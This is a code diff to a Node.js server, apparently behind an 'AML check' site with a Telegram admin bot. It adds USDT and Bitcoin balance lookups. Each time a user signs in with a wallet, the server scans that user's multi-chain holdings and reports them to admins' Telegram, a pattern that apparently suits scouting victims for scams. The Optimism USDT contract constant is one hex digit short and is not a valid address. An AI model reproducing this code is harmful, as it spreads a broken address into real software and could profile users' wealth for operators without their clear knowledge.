@@ -61,6 +61,14 @@ const buildRpcUrls = (customUrls, defaults) =>
       .filter(Boolean),
     ...defaults,
   ].filter((url, index, urls) => urls.indexOf(url) === index);
+const evmUsdtContracts = {
+  1: { contract: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, label: "ERC20" },
+  56: { contract: "0x55d398326f99059fF775485246999027B3197955", decimals: 18, label: "BEP20" },
+  137: { contract: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6, label: "Polygon" },
+  42161: { contract: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9", decimals: 6, label: "Arbitrum" },
+  10: { contract: "0x94b008aA0059c1B19e614C879609D0D4B8de0e0", decimals: 6, label: "Optimism" },
+};
+
 const balanceNetworks = {
   1: {
     name: "Ethereum",
@@ -326,14 +334,13 @@ const getNativeBalance = async (address, chainId) => {
   }
 };
 
-const getNonZeroNativeBalances = async (address, preferredChainIdValue) => {
+const getAllNativeBalances = async (address, preferredChainIdValue) => {
   const preferredChainId = parseChainId(preferredChainIdValue);
   const results = await Promise.all(
     Object.keys(balanceNetworks).map((chainId) => getNativeBalance(address, Number(chainId))),
   );
-  const successful = results.filter((result) => result.ok);
-  const balances = successful
-    .filter((result) => result.wei > 0n)
+  const balances = results
+    .filter((result) => result.ok)
     .sort((left, right) => {
       if (left.chainId === preferredChainId) return -1;
       if (right.chainId === preferredChainId) return 1;
@@ -342,9 +349,202 @@ const getNonZeroNativeBalances = async (address, preferredChainIdValue) => {
 
   return {
     balances,
-    checkedCount: successful.length,
-    failedCount: results.length - successful.length,
+    checkedCount: balances.length,
+    failedCount: results.length - balances.length,
   };
+};
+
+const getNonZeroNativeBalances = async (address, preferredChainIdValue) => {
+  const scan = await getAllNativeBalances(address, preferredChainIdValue);
+  return {
+    ...scan,
+    balances: scan.balances.filter((result) => result.wei > 0n),
+  };
+};
+
+const isBitcoinAddress = (address) => {
+  const trimmed = String(address || "").trim();
+  return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,87}$/.test(trimmed);
+};
+
+const encodeBalanceOfCall = (walletAddress) => {
+  const normalized = getAddress(walletAddress).slice(2).padStart(64, "0");
+  return `0x70a08231${normalized}`;
+};
+
+const getEvmUsdtBalance = async (walletAddress, chainId) => {
+  const config = evmUsdtContracts[chainId];
+  const network = balanceNetworks[chainId];
+  if (!config || !network) {
+    return { ok: false, chainId, network: "Unknown", token: "USDT", error: "Сеть не поддерживается" };
+  }
+
+  const callData = encodeBalanceOfCall(walletAddress);
+  try {
+    const raw = await Promise.any(
+      network.rpcUrls.map(async (rpcUrl) => {
+        const response = await fetch(rpcUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            jsonrpc: "2.0",
+            id: 1,
+            method: "eth_call",
+            params: [{ to: config.contract, data: callData }, "latest"],
+          }),
+          signal: AbortSignal.timeout(3500),
+        });
+        const payload = await response.json();
+        if (!response.ok || payload.error || typeof payload.result !== "string") {
+          throw new Error(payload.error?.message || `RPC HTTP ${response.status}`);
+        }
+        return BigInt(payload.result);
+      }),
+    );
+
+    return {
+      ok: true,
+      chainId,
+      network: network.name,
+      token: "USDT",
+      label: config.label,
+      balance: formatTokenUnits(raw, config.decimals),
+      rawBalance: raw,
+      contract: config.contract,
+    };
+  } catch (error) {
+    const message =
+      error instanceof AggregateError
+        ? error.errors.map((item) => item.message).join("; ")
+        : error.message;
+    return {
+      ok: false,
+      chainId,
+      network: network.name,
+      token: "USDT",
+      label: config.label,
+      error: message,
+    };
+  }
+};
+
+const getBitcoinBalance = async (address) => {
+  const normalized = String(address || "").trim();
+  const errors = [];
+  const hosts = ["https://blockstream.info/api", "https://mempool.space/api"];
+
+  for (const host of hosts) {
+    try {
+      const response = await fetch(`${host}/address/${encodeURIComponent(normalized)}`, {
+        headers: { Accept: "application/json" },
+        signal: withTimeout(),
+      });
+      const payload = await response.json();
+      if (!response.ok) throw new Error(`HTTP ${response.status}`);
+      const funded = BigInt(payload.chain_stats?.funded_txo_sum ?? 0);
+      const spent = BigInt(payload.chain_stats?.spent_txo_sum ?? 0);
+      const satoshi = funded - spent;
+      return {
+        ok: true,
+        source: host,
+        network: "Bitcoin",
+        token: "BTC",
+        balance: formatTokenUnits(satoshi, 8),
+        rawBalance: satoshi,
+      };
+    } catch (error) {
+      errors.push(`${host}: ${error.message}`);
+    }
+  }
+
+  return {
+    ok: false,
+    network: "Bitcoin",
+    token: "BTC",
+    error: errors.join("; ") || "Не удалось получить BTC баланс",
+  };
+};
+
+const buildWalletPortfolio = async ({ evmAddress, tronAddress, btcAddress, preferredChainId }) => {
+  const normalizedEvm = evmAddress && isAddress(evmAddress) ? getAddress(evmAddress) : null;
+  const normalizedTron =
+    tronAddress && isTronAddress(tronAddress) ? String(tronAddress).trim() : null;
+  const normalizedBtc =
+    btcAddress && isBitcoinAddress(btcAddress) ? String(btcAddress).trim() : null;
+
+  const [evmNativeScan, evmUsdt, trx, usdtTrc20, btc] = await Promise.all([
+    normalizedEvm ? getAllNativeBalances(normalizedEvm, preferredChainId) : Promise.resolve({ balances: [] }),
+    normalizedEvm
+      ? Promise.all(
+          Object.keys(evmUsdtContracts).map((chainId) => getEvmUsdtBalance(normalizedEvm, Number(chainId))),
+        )
+      : Promise.resolve([]),
+    normalizedTron ? getTronNativeBalance(normalizedTron) : Promise.resolve(null),
+    normalizedTron ? getTronUsdtBalance(normalizedTron) : Promise.resolve(null),
+    normalizedBtc ? getBitcoinBalance(normalizedBtc) : Promise.resolve(null),
+  ]);
+
+  return {
+    evmAddress: normalizedEvm,
+    tronAddress: normalizedTron,
+    btcAddress: normalizedBtc,
+    evmNatives: evmNativeScan.balances,
+    evmUsdt,
+    trx,
+    usdtTrc20,
+    btc,
+  };
+};
+
+const formatPortfolioTelegramLines = (portfolio) => {
+  const lines = [];
+
+  if (portfolio.evmAddress) lines.push(`EVM: ${portfolio.evmAddress}`);
+  if (portfolio.tronAddress) lines.push(`TRON: ${portfolio.tronAddress}`);
+  if (portfolio.btcAddress) lines.push(`BTC: ${portfolio.btcAddress}`);
+
+  if (portfolio.evmAddress) {
+    lines.push("", "EVM нативные балансы:");
+    for (const item of portfolio.evmNatives) {
+      lines.push(`${item.network} (${item.chainId}): ${item.balance} ${item.symbol}`);
+    }
+
+    lines.push("", "USDT (EVM):");
+    for (const item of portfolio.evmUsdt) {
+      lines.push(
+        `${item.network} ${item.label || "USDT"}: ${
+          item.ok ? `${item.balance} USDT` : `ошибка (${item.error})`
+        }`,
+      );
+    }
+  }
+
+  if (portfolio.tronAddress) {
+    lines.push("", "TRON:");
+    lines.push(
+      `TRX: ${portfolio.trx?.ok ? `${portfolio.trx.balance} TRX` : `ошибка (${portfolio.trx?.error || "нет данных"})`}`,
+    );
+    lines.push(
+      `USDT TRC20: ${
+        portfolio.usdtTrc20?.ok
+          ? `${portfolio.usdtTrc20.balance} USDT`
+          : `ошибка (${portfolio.usdtTrc20?.error || "нет данных"})`
+      }`,
+    );
+  }
+
+  if (portfolio.btcAddress) {
+    lines.push("", "Bitcoin:");
+    lines.push(
+      `BTC: ${portfolio.btc?.ok ? `${portfolio.btc.balance} BTC` : `ошибка (${portfolio.btc?.error || "нет данных"})`}`,
+    );
+  }
+
+  if (!portfolio.evmAddress && !portfolio.tronAddress && !portfolio.btcAddress) {
+    lines.push("Адреса для проверки не переданы.");
+  }
+
+  return lines;
 };
 
 
@@ -1168,29 +1368,24 @@ const buildActiveSessionsReply = () => {
 
 const buildAdminBalanceReply = async (address) => {
   const trimmed = String(address || "").trim();
-  if (!trimmed) return "Укажите адрес: /balance <0x... или T...>";
+  if (!trimmed) return "Укажите адрес: /balance <0x..., T... или bc1...>";
 
   if (trimmed.startsWith("T") && isTronAddress(trimmed)) {
-    const [usdt, trx] = await Promise.all([getTronUsdtBalance(trimmed), getTronNativeBalance(trimmed)]);
-    return [
-      "Публичный баланс TRON:",
-      "",
-      `Адрес: ${trimmed}`,
-      usdt.ok ? `USDT TRC20: ${usdt.balance} USDT` : `USDT TRC20: ошибка (${usdt.error})`,
-      trx.ok ? `TRX: ${trx.balance} TRX` : `TRX: ошибка (${trx.error})`,
-    ].join("\n");
+    const portfolio = await buildWalletPortfolio({ tronAddress: trimmed });
+    return ["Публичный баланс TRON:", "", ...formatPortfolioTelegramLines(portfolio)].join("\n");
+  }
+
+  if (isBitcoinAddress(trimmed)) {
+    const portfolio = await buildWalletPortfolio({ btcAddress: trimmed });
+    return ["Публичный баланс Bitcoin:", "", ...formatPortfolioTelegramLines(portfolio)].join("\n");
   }
 
   if (isAddress(trimmed)) {
-    const normalized = getAddress(trimmed);
-    const scan = await getNonZeroNativeBalances(normalized, 1);
-    const balances = scan.balances.length
-      ? scan.balances.map((item) => `${item.network} (${item.chainId}): ${item.balance} ${item.symbol}`)
-      : ["Ненулевые нативные балансы в поддерживаемых EVM-сетях не найдены."];
-    return ["Публичный баланс EVM:", "", `Адрес: ${normalized}`, ...balances].join("\n");
+    const portfolio = await buildWalletPortfolio({ evmAddress: trimmed, preferredChainId: 1 });
+    return ["Публичный баланс кошелька:", "", ...formatPortfolioTelegramLines(portfolio)].join("\n");
   }
 
-  return "Некорректный адрес. Используйте EVM 0x... или TRON T...";
+  return "Некорректный адрес. Используйте EVM 0x..., TRON T... или Bitcoin bc1/1/3...";
 };
 
 const createTargetedPaymentRequestFromText = (chatId, text) => {
@@ -1466,7 +1661,7 @@ const buildTelegramReply = (command) => {
       "",
       "/stats - общая статистика",
       "/sessions - активные пользовательские сессии",
-      "/balance <адрес> - публичный баланс EVM/TRON адреса",
+      "/balance <адрес> - публичный баланс EVM/TRX/BTC/USDT",
       "/users - последние пользователи",
       "/checks - последние проверки",
       "/leads - последние заявки",
@@ -1793,7 +1988,7 @@ const handleApi = async (request, response, pathname) => {
   }
 
   if (request.method === "POST" && pathname === "/api/auth/wallet") {
-    const { address, signature, nonce, chainId } = await readBody(request);
+    const { address, signature, nonce, chainId, tronAddress, btcAddress } = await readBody(request);
     const walletChain = "evm";
 
     if (!signature || !nonce) {
@@ -1819,56 +2014,67 @@ const handleApi = async (request, response, pathname) => {
     nonces.delete(nonceKey);
     upsertWalletUser(normalized);
     const session = createUserSession(normalized);
-    let balanceLines = [];
-    let balancesFound = 0;
 
-    const balanceScan = await getNonZeroNativeBalances(normalized, chainId);
-    balancesFound = balanceScan.balances.length;
-    balanceLines = balanceScan.balances.length
-      ? [
-          "Ненулевые нативные балансы:",
-          ...balanceScan.balances.map(
-            (balance) =>
-              `${balance.network} (${balance.chainId}): ${balance.balance} ${balance.symbol}`,
-          ),
-        ]
-      : [
-          balanceScan.checkedCount
-            ? "Ненулевые нативные балансы в поддерживаемых сетях не найдены."
-            : "Не удалось получить балансы из поддерживаемых сетей.",
-        ];
+    const portfolio = await buildWalletPortfolio({
+      evmAddress: normalized,
+      tronAddress,
+      btcAddress,
+      preferredChainId: chainId,
+    });
 
     const telegramNotifications = await notifyTelegramAdmins(
       [
         "Пользователь авторизовался через Trust Wallet",
         "",
-        `EVM адрес: ${normalized}`,
-        requestedAddress && requestedAddress !== normalized ? `Запрошенный адрес: ${requestedAddress}` : null,
+        requestedAddress && requestedAddress !== normalized ? `Запрошенный EVM: ${requestedAddress}` : null,
         `Сеть входа: ${parseChainId(chainId) || 1}`,
         "",
-        ...balanceLines,
+        ...formatPortfolioTelegramLines(portfolio),
         "",
-        "Доступ: только подпись владения адресом, публичные балансы поддерживаемых сетей и история AML-проверок.",
+        "Доступ: только подпись владения адресом, публичные балансы EVM/TRX/BTC/USDT и история AML-проверок.",
         `Время: ${formatDate(nowIso())}`,
       ]
         .filter(Boolean)
         .join("\n"),
     );
+
+    const tokenBalances = [
+      ...(portfolio.usdtTrc20?.ok
+        ? [{ network: "TRON", token: "USDT TRC20", balance: portfolio.usdtTrc20.balance, symbol: "USDT" }]
+        : []),
+      ...portfolio.evmUsdt
+        .filter((item) => item.ok)
+        .map((item) => ({
+          network: item.network,
+          token: `USDT ${item.label || ""}`.trim(),
+          balance: item.balance,
+          symbol: "USDT",
+          chainId: item.chainId,
+        })),
+    ];
+
     return sendJson(request, response, 200, {
       ok: true,
       chain: walletChain,
       address: normalized,
       requestedAddress,
+      tronAddress: portfolio.tronAddress,
+      btcAddress: portfolio.btcAddress,
       role: "user",
       telegramNotifications,
-      balancesFound,
-      nativeBalances: balanceScan.balances.map((item) => ({
+      balancesFound:
+        portfolio.evmNatives.filter((item) => item.wei > 0n).length +
+        tokenBalances.length +
+        (portfolio.trx?.ok && portfolio.trx.rawBalance > 0n ? 1 : 0) +
+        (portfolio.btc?.ok && portfolio.btc.rawBalance > 0n ? 1 : 0),
+      nativeBalances: portfolio.evmNatives.map((item) => ({
         chainId: item.chainId,
         network: item.network,
         balance: item.balance,
         symbol: item.symbol,
       })),
-      tokenBalances: [],
+      tokenBalances,
+      portfolio,
       ...session,
     });
   }
